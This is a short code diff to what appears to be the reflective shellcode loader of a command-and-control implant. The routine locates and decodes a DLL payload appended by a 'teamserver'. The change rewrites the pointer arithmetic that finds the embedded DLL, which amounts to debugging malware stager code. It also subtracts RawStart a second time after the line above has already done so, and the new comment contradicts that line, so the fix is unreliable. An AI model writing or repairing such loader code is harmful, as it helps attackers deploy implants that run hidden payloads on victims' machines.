@@ -75,7 +75,9 @@ SEC( text, B ) VOID Entry( VOID )
         }
         RawSize -= RawStart;
 
-        DllStart = C_PTR( KaynLibraryLdr + RawSize );
+        // RawSize spans header + raw sections, so KaynLibraryLdr + RawSize
+        // lands just past the appended DLL — back off by RawStart to reach it.
+        DllStart = C_PTR( KaynLibraryLdr + RawSize - RawStart );
         DllSize  = KHdrSize + KMemSize;
 
         // Only decode when the teamserver actually encoded the payload (it
